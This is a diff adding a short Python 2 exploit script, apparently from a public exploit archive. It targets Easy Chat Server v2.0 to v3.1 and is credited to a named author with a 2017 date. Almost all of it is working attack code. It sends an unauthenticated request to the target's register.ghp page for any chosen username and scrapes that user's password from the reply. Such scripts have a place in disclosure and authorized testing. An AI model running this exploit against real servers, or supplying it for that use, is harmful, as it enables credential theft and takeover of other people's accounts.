@@ -1,0 +1,40 @@
+# Exploit Title: Easy Chat Server Remote Password Disclosure
+# Date: 09/10/2017
+# Software Link: http://echatserver.com/ecssetup.exe
+# Exploit Author: Aitezaz Mohsin
+# Vulnerable Version: v2.0 to v3.1
+# Vulnerability Type: Pre-Auth Remote Password Disclosure
+# Severity: Critical
+
+# =========================================================================================================
+#	Registeration page 'register.ghp' allows disclosing ANY user's password.
+# Remote un-authenticated attackers can send HTTP GET requests to obtain ANY Easy Chat Server user password.
+# =========================================================================================================
+
+# USAGE: python exploit.py ip username
+
+#!/usr/bin/python
+
+import urllib
+import re
+import requests
+import sys
+
+ip = sys.argv[1]
+username = sys.argv[2]
+
+url = 'http://' + ip + '/register.ghp?username=' + username + '&password='
+response = requests.get(url)
+html = response.content
+
+pattern = '<INPUT type="password" name="Password" maxlength="30"  value="(.+?)">'
+result = re.compile(pattern)
+
+password = re.findall(result,html)
+
+x = ''.join(password)
+
+password = x.replace("[", "")
+password = x.replace("]", "")
+
+print "Password: " + password
